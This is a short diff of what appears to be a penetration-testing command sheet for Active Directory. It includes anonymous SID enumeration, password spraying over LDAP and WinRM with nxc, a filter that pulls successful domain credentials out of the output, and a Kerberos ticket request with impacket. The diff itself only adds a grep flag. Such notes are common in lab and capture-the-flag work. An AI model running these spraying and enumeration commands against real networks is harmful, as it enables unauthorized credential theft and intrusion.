@@ -127,7 +127,7 @@ impacket-lookupsid 'anonymous'@$TARGET 10000 -no-pass | cut -d '\' -f 2 | grep '
 (nxc ldap "$TARGET" -u usernames -p usernames --continue-on-success &)
 (nxc winrm "$TARGET" -u usernames -p passwords --continue-on-success &)
 (nxc winrm "$TARGET" -u usernames -p usernames --continue-on-success &)
-) | grep --line-buffered -oP '\d{1,3}(?:\.\d{1,3}){3}\s+\d+\s+\S+\s+\[\+\] $DOM\\\S+:\S*' | sed -E 's/($DOM\\)([^:]+:[^ ]+)/\1\x1b[1;33m\2\x1b[0m/'
+) | grep -a --line-buffered -oP '\d{1,3}(?:\.\d{1,3}){3}\s+\d+\s+\S+\s+\[\+\] $DOM\\\S+:\S*' | sed -E 's/($DOM\\)([^:]+:[^ ]+)/\1\x1b[1;33m\2\x1b[0m/'
 
 sudo ntpdate -u $TARGET
 impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME=`pwd`/$USERNAME.ccache
